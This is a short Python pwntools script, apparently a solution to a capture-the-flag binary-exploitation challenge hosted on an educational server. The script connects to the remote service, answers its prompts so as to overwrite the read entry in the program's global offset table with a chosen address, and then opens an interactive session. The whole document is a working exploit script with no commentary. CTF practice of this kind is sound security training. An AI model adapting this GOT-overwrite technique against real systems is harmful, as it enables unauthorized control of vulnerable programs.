#!/usr/bin/python3
from pwn import *

context.arch = 'amd64'

r = remote('edu-ctf.zoolab.org', 10004)

read_got = 0x404038
write_got = 0x401030

r.sendlineafter('Overwrite addr: ', str(read_got))
r.sendafter('Overwrite 8 bytes value: ', p64(write_got))
r.interactive()